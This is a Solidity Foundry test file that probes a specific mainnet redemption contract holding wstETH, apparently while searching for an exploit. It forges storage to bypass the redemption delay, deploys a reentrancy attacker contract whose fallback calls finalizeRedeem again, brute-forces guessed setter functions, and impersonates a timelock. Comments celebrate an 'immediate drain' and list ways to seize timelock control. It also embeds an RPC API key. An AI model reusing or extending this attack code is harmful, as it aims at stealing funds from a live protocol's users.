// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * FINALIZE DEEP DIVE
 *
 * Storage manipulation fails even with timestamp=0
 * This means there's additional validation
 *
 * Second slot has data:
 * 0x000000000000000010fea8cfd532e43f00000000000000368b5f02e6891868bd
 *
 * Hypothesis: finalized flag, exchange rate, or other validation state
 */
contract FinalizeDeepDive is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionStorageComplete() public {
        console.log("=== COMPLETE REDEMPTION STORAGE ANALYSIS ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Calculate all relevant storage slots
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        console.log("Array length slot:");
        console.logBytes32(arrayLengthSlot);
        console.log("Value:");
        console.logBytes32(vm.load(R0, arrayLengthSlot));

        console.log("\nRedemption element storage (5 slots):");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = bytes32(uint256(arrayBaseSlot) + i);
            bytes32 val = vm.load(R0, slot);
            if (uint256(val) != 0) {
                console.log("Offset %d:", i);
                console.logBytes32(val);
            }
        }

        // Decode the struct
        bytes32 data0 = vm.load(R0, arrayBaseSlot);
        bytes32 data1 = vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1));

        console.log("\n=== DECODING ===");

        // data0: 0x0000000000000000000000000000003635c9adc5dea0000000000000696a728b
        // This looks like: (padding)(amount: 1000e18 = 0x3635c9adc5dea00000)(timestamp: 0x696a728b)
        // But the layout is weird...

        uint256 raw0 = uint256(data0);
        console.log("Raw data0:", raw0);

        // Try different offsets
        // Lower 32 bits might be timestamp
        uint32 lowTimestamp = uint32(raw0);
        console.log("Lower 32 bits (timestamp?):", lowTimestamp);
        console.log("As date:", lowTimestamp);

        // Next 96 bits might be amount
        uint96 midAmount = uint96(raw0 >> 32);
        console.log("Bits 32-127 (amount?):", uint256(midAmount) / 1e18, "e18");

        // data1: 0x000000000000000010fea8cfd532e43f00000000000000368b5f02e6891868bd
        uint256 raw1 = uint256(data1);
        console.log("\nRaw data1:", raw1);

        // This could be exchange rate or price data
        // Lower 128 bits
        uint128 low128 = uint128(raw1);
        console.log("Lower 128 bits:", low128);

        // Upper 128 bits
        uint128 high128 = uint128(raw1 >> 128);
        console.log("Upper 128 bits:", high128);
    }

    function test_FinalizeWithCorrectTimestamp() public {
        console.log("=== FINALIZE WITH CORRECT STORAGE LAYOUT ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Get storage slots
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        bytes32 data0Original = vm.load(R0, arrayBaseSlot);
        bytes32 data1Original = vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1));

        console.log("Original data0:");
        console.logBytes32(data0Original);
        console.log("Original data1:");
        console.logBytes32(data1Original);

        // The struct layout based on analysis:
        // Slot 0: {uint32 timestamp at bits 0-31, uint96 amount at bits 32-127, ...}
        // Slot 1: {exchange rate data?}

        uint256 raw0 = uint256(data0Original);
        uint32 timestamp = uint32(raw0);
        uint96 amount = uint96(raw0 >> 32);

        console.log("\nParsed timestamp:", timestamp);
        console.log("Parsed amount:", uint256(amount) / 1e18);
        console.log("Current block.timestamp:", block.timestamp);
        console.log("Delay check: timestamp + 7 days =", uint256(timestamp) + 7 days);

        // Manipulate: set timestamp to very old
        uint256 manipulated0 = (uint256(amount) << 32) | uint256(1); // timestamp = 1
        vm.store(R0, arrayBaseSlot, bytes32(manipulated0));

        console.log("\nManipulated data0:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));

        // Try finalize
        vm.startPrank(attacker);
        (bool success, bytes memory returnData) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();

        console.log("Finalize success:", success);
        if (!success && returnData.length > 0) {
            console.log("Return data length:", returnData.length);
            if (returnData.length >= 68) {
                // Decode error message
                assembly {
                    returnData := add(returnData, 68)
                }
                console.log("Error might be in return data");
            }
        }

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_TraceFinalizeTx() public {
        console.log("=== TRACE FINALIZE TRANSACTION ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Record storage before
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        // Warp to past delay
        vm.warp(block.timestamp + 7 days + 1);

        console.log("After 7-day warp, testing finalize...");

        // Call finalize with verbose tracing
        vm.startPrank(attacker);

        // Check storage states
        console.log("\nStorage before finalize:");
        console.log("Array length:", uint256(vm.load(R0, arrayLengthSlot)));
        console.log("Redemption data0:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));
        console.log("Redemption data1:");
        console.logBytes32(vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1)));

        // Finalize
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nFinalize success:", success);
        console.log("wstETH received:", (attackerAfter - attackerBefore) / 1e18);

        // Check storage after
        console.log("\nStorage after finalize:");
        console.log("Array length:", uint256(vm.load(R0, arrayLengthSlot)));
        console.log("Redemption data0:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));
        console.log("Redemption data1:");
        console.logBytes32(vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1)));

        vm.stopPrank();
    }

    function test_FinalizeReentrancy() public {
        console.log("=== FINALIZE REENTRANCY ===\n");

        // What if we can reenter during finalize?
        // The wstETH transfer might allow reentrancy

        ReentrancyFinalizer rf = new ReentrancyFinalizer(R0, wstETH, TASSET);
        deal(TASSET, address(rf), 10000e18);

        console.log("ReentrancyFinalizer deployed:", address(rf));

        rf.prepareRedemption();

        // Warp
        vm.warp(block.timestamp + 7 days + 1);

        console.log("\nAttempting reentrant finalize...");
        rf.attack();

        console.log("RF wstETH balance:", IERC20(wstETH).balanceOf(address(rf)) / 1e18);
    }

    function test_ModifyGlobalDelay() public {
        console.log("=== MODIFY GLOBAL DELAY ===\n");

        // R0 slot 4 contains the delay at bits 96-127
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Original slot 4:");
        console.logBytes32(slot4);

        uint256 raw = uint256(slot4);
        uint256 delay = (raw >> 96) & type(uint32).max;
        console.log("Original delay:", delay / 86400, "days");

        // Zero out the delay bits (96-127)
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        uint256 zeroDelay = raw & mask;

        vm.store(R0, bytes32(uint256(4)), bytes32(zeroDelay));

        bytes32 newSlot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Modified slot 4:");
        console.logBytes32(newSlot4);

        uint256 newDelay = (uint256(newSlot4) >> 96) & type(uint32).max;
        console.log("New delay:", newDelay, "seconds");

        // Now create redemption and try immediate finalize
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        console.log("\nWith delay=0, trying immediate finalize...");
        uint256 before = IERC20(wstETH).balanceOf(attacker);
        (bool success,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        uint256 gained = IERC20(wstETH).balanceOf(attacker) - before;

        console.log("Finalize success:", success);
        console.log("wstETH gained:", gained / 1e18);

        if (gained > 0) {
            console.log("\n*** IMMEDIATE DRAIN WORKS WITH DELAY=0! ***");
            console.log("If we can find a way to set delay=0, drain is immediate!");
        }

        vm.stopPrank();
    }

    function test_FindDelayWritePath() public {
        console.log("=== FIND DELAY WRITE PATH ===\n");

        // Search for any function that can modify slot 4

        // Check if there's a setDelay function
        (bool s1, bytes memory d1) = R0.staticcall(abi.encodeWithSignature("delay()"));
        if (s1) {
            console.log("delay():", abi.decode(d1, (uint256)) / 86400, "days");
        }

        // Try various setter functions
        vm.startPrank(attacker);

        bytes4[] memory setters = new bytes4[](10);
        setters[0] = bytes4(keccak256("setDelay(uint256)"));
        setters[1] = bytes4(keccak256("updateDelay(uint256)"));
        setters[2] = bytes4(keccak256("setRedemptionDelay(uint256)"));
        setters[3] = bytes4(keccak256("setCooldown(uint256)"));
        setters[4] = bytes4(keccak256("setConfig(uint256)"));
        setters[5] = bytes4(keccak256("initialize(uint256)"));
        setters[6] = bytes4(keccak256("setParams(uint256,uint256,uint256)"));
        setters[7] = bytes4(keccak256("configure(uint256)"));
        setters[8] = bytes4(keccak256("adjustDelay(uint256)"));
        setters[9] = bytes4(keccak256("modifyDelay(uint256)"));

        for (uint i = 0; i < setters.length; i++) {
            (bool success,) = R0.call(abi.encodeWithSelector(setters[i], 0));
            if (success) {
                console.log("Setter %d succeeded!", i);

                // Check if delay changed
                bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
                uint256 newDelay = (uint256(slot4) >> 96) & type(uint32).max;
                console.log("New delay:", newDelay);
            }
        }

        vm.stopPrank();
    }

    function test_TimelockSetDelay() public {
        console.log("=== TIMELOCK SET DELAY ===\n");

        address TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

        // Check if TIMELOCK can set delay
        vm.startPrank(TIMELOCK);

        console.log("Calling setDelay(0) as TIMELOCK...");
        (bool success,) = R0.call(abi.encodeWithSignature("setDelay(uint256)", 0));
        console.log("Success:", success);

        if (success) {
            bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
            uint256 newDelay = (uint256(slot4) >> 96) & type(uint32).max;
            console.log("New delay:", newDelay, "seconds");

            if (newDelay == 0) {
                console.log("\n*** TIMELOCK CAN SET DELAY TO 0! ***");
            }
        }

        vm.stopPrank();

        // If TIMELOCK can set delay=0, we need to find a way to:
        // 1. Become TIMELOCK
        // 2. Make TIMELOCK execute our tx
        // 3. Exploit a bug in TIMELOCK
    }
}

contract ReentrancyFinalizer {
    address r0;
    address wsteth;
    address tasset;
    uint reentryCount;
    bool attacking;

    constructor(address _r0, address _wsteth, address _tasset) {
        r0 = _r0;
        wsteth = _wsteth;
        tasset = _tasset;
    }

    function prepareRedemption() external {
        IERC20(tasset).approve(r0, type(uint256).max);
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
    }

    function attack() external {
        attacking = true;
        r0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        attacking = false;
    }

    // Called when receiving wstETH
    fallback() external payable {
        if (attacking && reentryCount < 3) {
            reentryCount++;
            // Try to finalize again
            r0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        }
    }

    receive() external payable {}
}
